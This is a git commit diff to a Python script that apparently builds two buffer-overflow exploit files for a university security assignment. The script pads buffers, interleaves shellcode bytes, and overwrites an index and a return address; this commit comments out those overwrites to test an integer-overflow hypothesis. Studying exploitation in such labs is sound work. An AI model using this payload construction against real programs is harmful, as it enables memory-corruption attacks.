22a0e4470f3ed74296c3a5b95a6761b788c0a742
Mandy Wang <shunflower320@gmail.com>
2020-10-19 00:09:52 +0800

    does not overflow into byte_read

--- 2/a2/buffer_overflow/script.py
+++ 2/a2/buffer_overflow/script.py
@@ -8,18 +8,25 @@ with open("exploit1", "wb+") as f1:
         f1.write(shell_code[i:i+1])
 
     f1.write(b'\xff'*(32-14)) # fill the rest of buf
-    f1.write(b'\xff'*12) # up to 104
-    f1.write(b'\xff'*4) # filling 104 (idx)
-    f1.write(b'\x80\xff\xff\x00') # 112
-    f1.write(b'\x00\xff\xff\x00') # return addr
+    f1.write(b'\xff'*8) # up to 104
+    """
+    hypothesis: attempting to overwrite byte_read1 resulted in idx < byte_read1 + byte_read2
+    because of integer overflow (since they are both \xff*4).
+    
+    try: not overflowing into them
+    """
+
+    # f1.write(b'\xff'*4) # filling 104 (idx)
+    # f1.write(b'\x80\xff\xff\x00') # 112
+    # f1.write(b'\x00\xff\xff\x00') # return addr
 
 with open("exploit2", "wb+") as f2:
     for j in range (1, len(shell_code), 2):
         f2.write(shell_code[j:j+1])
 
     f2.write(b'\x00'*(32-13))
-    f2.write(b'\x00'*12)
-    f2.write(b'\x00'*4) # idx
-    f2.write(b'\xe3\xff\x7f\x00') # 112
-    f2.write(b'\xe3\xff\x7f\x00') # return
+    f2.write(b'\x00'*8)
+    # f2.write(b'\x00'*4) # idx
+    # f2.write(b'\xe3\xff\x7f\x00') # 112
+    # f2.write(b'\xe3\xff\x7f\x00') # return
 
